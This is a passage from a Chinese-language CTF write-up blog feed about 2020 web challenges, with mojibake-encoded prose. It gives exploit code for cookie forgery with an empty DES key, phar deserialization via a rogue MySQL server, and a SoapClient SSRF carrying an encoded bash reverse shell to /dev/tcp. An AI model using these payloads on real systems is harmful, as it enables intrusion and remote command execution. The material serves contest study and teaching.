<p>è¿™é‡Œä¼šé‡å®šå‘åˆ°check.php,é¢˜ç›®å¹¶æ²¡æœ‰ç»™check.phpå†…å®¹ï¼Œä½†æ˜¯å‰é¢æˆ‘ä»¬éƒ½å·²ç»è¿ä¸Šé©¬äº†ï¼Œå°±å¯ä»¥çœ‹åˆ°check.phpçš„å…·ä½“å†…å®¹</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312120802997.png" alt="image-20200312120802997"></p>
<p>ç„¶åçœ‹çœ‹bot.py</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312120855917.png" alt="image-20200312120855917"></p>
<p>botä¼šåˆ°è¿™flagå’Œæˆ‘ä»¬çš„session_idå»è®¿é—®teacher.php,</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312121003825.png" alt="image-20200312121003825"></p>
<p>teacher.phpå°±æ˜¯è°ƒç”¨äº†showMessage()ï¼Œechoå‡º sesion_idå¯¹åº”çš„$this-&gt;info-&gt;messageã€‚æœ¬åœ°å¤ç°çš„æ—¶å€™bot.pyè€æ˜¯æŠ¥é”™ï¼Œç„¶åå°±æ²¡æœ‰è¯•ï¼Œå¯ä»¥æ‰‹å·¥å¸¦ä¸Šsession_idè®¿é—®teacher.php</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312131931542.png" alt="image-20200312131931542"></p>
<p>ç¡®å®å¯ä»¥ncåˆ°ã€‚</p>
<h1 id="0x04-not-hardweb"><a href="#0x04-not-hardweb" class="headerlink" title="0x04 not hardweb"></a>0x04 not hardweb</h1><p>éé¢„æœŸå¤ç°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">"user.php"</span>;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">"conn.php"</span>;</span><br><span class="line">    $IV = <span class="string">"********"</span>;<span class="comment">// you cant know that;</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">'user'</span>]) || !<span class="keyword">isset</span>($_COOKIE[<span class="string">'hash'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'key'</span>]))&#123;</span><br><span class="line">            $_SESSION[<span class="string">'key'</span>] = strval(mt_rand() &amp; <span class="number">0x5f5e0ff</span>);</span><br><span class="line">            $_SESSION[<span class="string">'iv'</span>] = $IV;</span><br><span class="line">        &#125;</span><br><span class="line">        $username = <span class="string">"guest"</span>;</span><br><span class="line">        $o = <span class="keyword">new</span> User($username);</span><br><span class="line">        <span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">        $ser_user = serialize($o);</span><br><span class="line">        $cipher = openssl_encrypt($ser_user, <span class="string">"des-cbc"</span>, $_SESSION[<span class="string">'key'</span>], <span class="number">0</span>, $_SESSION[<span class="string">'iv'</span>]);</span><br><span class="line">        setcookie(<span class="string">"user"</span>, base64_encode($cipher), time()+<span class="number">3600</span>);</span><br><span class="line">        setcookie(<span class="string">"hash"</span>, md5($ser_user), time() + <span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $user = base64_decode($_COOKIE[<span class="string">'user'</span>]);</span><br><span class="line">        $uid = openssl_decrypt($user, <span class="string">'des-cbc'</span>, $_SESSION[<span class="string">'key'</span>], <span class="number">0</span>, $_SESSION[<span class="string">'iv'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(md5($uid) !== $_COOKIE[<span class="string">'hash'</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"no hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $o = unserialize($uid);</span><br><span class="line">        <span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">        <span class="keyword">if</span> ($o-&gt;username === <span class="string">"admin"</span>)&#123;</span><br><span class="line">            $_SESSION[<span class="string">'name'</span>] = <span class="string">'admin'</span>;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">"hint.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœç›´æ¥æŠŠcookieä¸­çš„PHPSESSIDåˆ æ‰ï¼Œé‚£ä¹ˆSESSION[â€˜keyâ€™]å’ŒSESSION[â€˜ivâ€™]å°±ä¸ºç©ºï¼Œç„¶åç›´æ¥å°†æˆ‘ä»¬é€šè¿‡keyå’Œivä¸ºç©ºä¼ªé€ çš„cookieï¼Œä¼ ç»™æœåŠ¡å™¨ï¼Œç›´æ¥å°±ä¼šå˜æˆadmin.</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"username: $this-&gt;username\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> $user  = <span class="keyword">new</span> User(<span class="string">"admin"</span>);</span><br><span class="line"> $user= serialize($user);</span><br><span class="line"></span><br><span class="line"> $user1= base64_encode(openssl_encrypt($user, <span class="string">'des-cbc'</span>, <span class="string">''</span>, <span class="number">0</span>, <span class="string">''</span>));</span><br><span class="line"> <span class="keyword">echo</span> $user1.<span class="string">"\n"</span>;</span><br><span class="line"> <span class="keyword">echo</span> md5($user);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user:b3hIekw5Mk82WTQwbUk1M3RHYThQR0V4UmVZeHVSdE1ranZRYk43eksyVXhaTnFQZ2l1YkRKc0dpd1Z5cUlzVg&#x3D;&#x3D;</span><br><span class="line">hash:abc2f600e79557ef90ca4e07516b486f</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312135230044.png" alt="image-20200312135230044"></p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312135406279.png" alt="image-20200312135406279"></p>
<p>ç„¶åè¿™é“é¢˜ä¹‹åå°±æ˜¯ç”¨SoapClient æ‰“å†…ç½‘äº†ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$location &#x3D; &#39;http:&#x2F;&#x2F;10.10.1.12&#x2F;index.php?cc&#x3D;%60%24cc%60%3Bbash%20-c%20%27bash%20-i%20&gt;%26%20%2Fdev%2Ftcp%2Fip%2F8081%200&gt;%261%27%3B&#39;;</span><br><span class="line">$a &#x3D; new SoapClient(null, array(&#39;location&#39; &#x3D;&gt; $location ,&#39;uri&#39;  &#x3D;&gt; &#39;123&#39;));</span><br><span class="line">$user &#x3D; serialize($a);</span><br><span class="line">$user1&#x3D; base64_encode(openssl_encrypt($user, &#39;des-cbc&#39;, &#39;&#39;, 0, &#39;&#39;));</span><br><span class="line">echo $user1.&quot;\n&quot;;</span><br><span class="line">echo md5($user);</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†æŒ‰ä¹‹å‰çš„æ–¹æ³•å°±å¯ä»¥åå¼¹shelläº†ã€‚åé¢çš„æ²¡ç¯å¢ƒå°±ä¸åšäº†ã€‚</p>
<p>å‚è€ƒé“¾æ¥</p>
<p><a href="https://www.gem-love.com/ctf/1884.html#happyvacation_16solved_571pt" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1884.html#happyvacation_16solved_571pt</a></p>
<p><a href="http://nextcloud.chamd5.org/index.php/s/EYTZB4zgtqsfcge#pdfviewer" target="_blank" rel="noopener">http://nextcloud.chamd5.org/index.php/s/EYTZB4zgtqsfcge#pdfviewer</a></p>
<p><a href="https://mp.weixin.qq.com/s/oqojw9VoXOVqV9EmoRQKiA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/oqojw9VoXOVqV9EmoRQKiA</a></p>
<p><a href="http://ctf.njupt.edu.cn/382.html#hackme" target="_blank" rel="noopener">http://ctf.njupt.edu.cn/382.html#hackme</a></p>
<p><a href="https://mp.weixin.qq.com/s/RjTsvUsx65YTMIg3jejXng" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/RjTsvUsx65YTMIg3jejXng</a></p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>é«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›webéƒ¨åˆ†é¢˜è§£</title>
    <url>/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>webé¢˜ç›®å¾ˆå¥½ï¼Œå°±æ˜¯å¤šçš„çœ‹éƒ½çœ‹ä¸è¿‡æ¥ï¼Œåˆ«è¯´åšäº† ï¼Œå…¨ç¨‹é ç€å¸ˆå‚…å¸¦ï¼Œç»§ç»­åˆ’æ°´ï¼Œè®°å½•ä¸‹åšé¢˜å’Œå¤ç°</p>
<a id="more"></a>

<h1 id="webct"><a href="#webct" class="headerlink" title="webct"></a>webct</h1><p>æ‰«æå¯ä»¥å¾—åˆ°<a href="http://www.zipæºç ï¼Œé¢˜ç›®æ‰“å¼€çš„ç•Œé¢æ˜¯è¿™æ ·" target="_blank" rel="noopener">www.zipæºç ï¼Œé¢˜ç›®æ‰“å¼€çš„ç•Œé¢æ˜¯è¿™æ ·</a></p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309092409185.png" alt="image-20200309092409185">æœ‰ä¸¤ä¸ªåŠŸèƒ½ï¼Œä¸€ä¸ªè¿æ¥è¿œç¨‹mysqlæ•°æ®åº“ï¼Œä¸€ä¸ªå›¾ç‰‡ä¸Šä¼ ï¼Œæ¥ä¸‹æ¥å®¡è®¡æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//testsql.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">$ip = $_POST[<span class="string">'ip'</span>];</span><br><span class="line">$user = $_POST[<span class="string">'user'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$option = $_POST[<span class="string">'option'</span>];</span><br><span class="line">$m = <span class="keyword">new</span> db($ip,$user,$password,$option);</span><br><span class="line">$m-&gt;testquery();</span><br></pre></td></tr></table></figure>

<p>ä¼šæŠŠæˆ‘ä»¬POSTè¾“å…¥çš„ipã€userã€passwordã€optionä¼ ç»™dbç±»å»å®ä¾‹åŒ–$mã€‚çœ‹ä¸‹dbç±»çš„ä»£ç </p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309093110063.png" alt="image-20200309093110063"></p>
<p>ç„¶åçœ‹æ–‡ä»¶ä¸Šä¼ çš„æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//filestore.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"><span class="comment">//var_dump($_FILES["file"]);</span></span><br><span class="line">$file = <span class="keyword">new</span> File($_FILES[<span class="string">"file"</span>]);</span><br><span class="line">$fileupload = <span class="keyword">new</span> Fileupload($file);</span><br><span class="line">$fileupload-&gt;deal();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"å­˜å‚¨çš„å›¾ç‰‡:"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$ls = <span class="keyword">new</span> Listfile(<span class="string">'./uploads/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"><span class="keyword">echo</span> $ls-&gt;listdir().<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¼šæŠŠæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¼ ç»™Fileç±»å»å®ä¾‹åŒ–ï¼Œç„¶åå°†$fileå˜é‡ä¼ ç»™Fileuploadç±»å»å®ä¾‹åŒ–ï¼Œè°ƒç”¨$fileuploadçš„dealæ–¹æ³•ï¼Œç„¶ååˆå®ä¾‹åŒ–Listfileï¼Œè°ƒç”¨$lsçš„listdiræ–¹æ³•ï¼Œçœ‹ä¸‹æºç </p>
<ul>
<li>Fileç±»</li>
</ul>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309093951334.png" alt="image-20200309093951334"></p>
<p>åŠŸèƒ½å¾ˆç®€å•</p>
<ul>
<li>Fileuploadç±»</li>
</ul>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309093716970.png" alt="image-20200309093716970"></p>
<p>ç™½åå•æœºåˆ¶ï¼Œåº”è¯¥æ˜¯ä¸èƒ½ä¼ é©¬ã€‚</p>
<ul>
<li>Listfileç±»</li>
</ul>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309093901396.png" alt="image-20200309093901396"></p>
<p>ç¥å¥‡çš„__call()é­”æ³•å‡½æ•°ï¼Œç«Ÿç„¶å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œé‚£å°±æ˜¯ååºåˆ—åŒ–å®é”¤äº†ï¼Œå…¨å±€æœç´¢éƒ½æ‰¾ä¸åˆ°serialise()å‡½æ•°ï¼Œæ€ä¹ˆè§¦å‘ååºåˆ—åŒ–å‘¢ï¼Œä¹‹å‰è¿˜æœ‰ä¸€ä¸ªè¿æ¥mysqlçš„åŠŸèƒ½ï¼Œæƒ³èµ·ä¹‹å‰çš„é‚£ç¯‡CSS-T | Mysql Client ä»»æ„æ–‡ä»¶è¯»å–æ”»å‡»é“¾æ‹“å±•çš„<a href="https://paper.seebug.org/1112/" target="_blank" rel="noopener">æ–‡ç« </a>ã€‚</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309100302528.png" alt="image-20200309100302528"></p>
<p>åˆšå¥½å’Œä¹‹å‰çš„å›¾ç‰‡ä¸Šä¼ ç»“åˆï¼Œåœ¨vpsä¸Šæ­ä¸€ä¸ªRogue-mysql-server,ï¼ˆæ€ä¹ˆç”¨å°±ä¸ä»‹ç»äº†ï¼Œä¸Šæ–‡å†™çš„å¾ˆæ¸…æ¥šï¼‰å»è¯»ä¸Šä¼ çš„pharæ–‡ä»¶ï¼Œè§¦å‘ååºåˆ—åŒ–ï¼Œæ¬§å…‹ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¹‹å‰postä¼ çš„optionå˜é‡æ¥å¯ç”¨LOAD LOCAL INFILE</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309101105263.png" alt="image-20200309101105263">ç„¶åå¼€å§‹è¾“å…¥<strong><code>MYSQLI_OPT_LOCAL_INFILE</code></strong></p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309103020545.png" alt="image-20200309103020545"></p>
<p>ä½†æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œä½†æ˜¯æœåŠ¡å™¨ç«¯æ²¡æœ‰è¯»åˆ°æ–‡ä»¶ï¼Œç„¶ååœ¨æœ¬åœ°è¿›è¡Œæµ‹è¯•ï¼Œæˆ‘ä»¬ç›´æ¥æŠŠoptionå˜æˆ<code>MYSQLI_OPT_LOCAL_INFILE</code>å‘ç°åœ¨æœåŠ¡å™¨ç«¯æ˜¯å¯ä»¥è¯»åˆ°æ–‡ä»¶çš„ï¼Œ</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309104511384.png" alt="image-20200309104511384"></p>
<p>è¿™æ ·è®¾ç½®äº†ä¹‹åæ˜¯å¯ä»¥è¯»åˆ°æ–‡ä»¶çš„ï¼Œ</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309110611932.png" alt="image-20200309110611932"></p>
<p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬è¿™æ ·</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309110803039.png" alt="image-20200309110803039"></p>
<p>æ˜¯ä¸èƒ½è¯»åˆ°æ–‡ä»¶çš„</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309110936451.png" alt="image-20200309110936451"></p>
<p>åæ¥å»æŸ¥phpçš„æ‰‹å†Œçœ‹åˆ°</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309111041201.png" alt="image-20200309111041201"></p>
<p>optionæ˜¯intå‹çš„ï¼Œç„¶åå°±å»æŸ¥äº†phpçš„å¸¸é‡è¡¨ï¼ŒMYSQLI_OPT_LOCAL_INFILEæ˜¯8ã€‚</p>
<p>ç„¶åæŠŠoptionæ”¹æˆ8è¯•è¯•</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309111228502.png" alt="image-20200309111228502"></p>
<p>å¯ä»¥è¯»åˆ°æ–‡ä»¶</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309111401976.png" alt="image-20200309111401976"></p>
<p>ç„¶åå»ç”Ÿæˆpharæ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: admin</span></span><br><span class="line"><span class="comment"> * Date: 2020/3/8</span></span><br><span class="line"><span class="comment"> * Time: 10:11</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fileupload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file-&gt;xs();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Listfile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=<span class="string">"/ ;/readflag"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file;</span><br><span class="line">        system(<span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//unserialize('O:10:"Fileupload":1:&#123;s:4:"file";O:8:"Listfile":1:&#123;s:4:"file";s:1:"/";&#125;&#125;');</span></span><br><span class="line">@unlink(<span class="string">"dedecms.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"dedecms.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´</span></span><br><span class="line">$a=<span class="keyword">new</span> Listfile();</span><br><span class="line">$b=<span class="keyword">new</span> Fileupload($a);</span><br><span class="line"><span class="keyword">echo</span> serialize($b);</span><br><span class="line">$phar-&gt;setMetadata($b); <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå°†ç”Ÿæˆçš„pharæ–‡ä»¶æ”¹åï¼Œä¼ ä¸Šå»ï¼Œå¯ä»¥çœ‹åˆ°æ–‡ä»¶å ï¼Œç»“åˆæºç é‡Œçš„è·¯å¾„</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309111822509.png" alt="image-20200309111822509"></p>
<p>æˆ‘ä»¬ä¿®æ”¹vpsä¸ŠRogue-mysql-serverè¯»æ–‡ä»¶çš„åç§°ï¼Œ</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309112111030.png" alt="image-20200309112111030"></p>
<p>ä¹‹åè¿æ¥è¿œç¨‹mysqlæœåŠ¡å™¨ï¼Œè§¦å‘ååºåˆ—åŒ–</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309112354943.png" alt="image-20200309112354943"></p>
<p>ç„¶åflagå°±æ¥äº†ã€‚</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309112642322.png" alt="image-20200309112642322"></p>
<h1 id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h1><p><strong>è€ƒç‚¹</strong>ï¼špython ååºåˆ—åŒ–</p>
<p>è¿™é¢˜æ˜¯åŸé¢˜ï¼Œç„¶è€Œæˆ‘å¼€å§‹å¹¶æ²¡æœ‰æ‰¾åˆ°ã€‚ã€‚2019-SJTU-PICKLE-Revenge,æ¯”èµ›ç›´æ¥pyè„šæœ¬ï¼Œè·‘çš„ï¼Œæ¯”å®Œèµ›å¾—å¥½å¥½åˆ†æ</p>
<p>é¢˜ç›®ç›´æ¥ç»™äº†æºç </p>
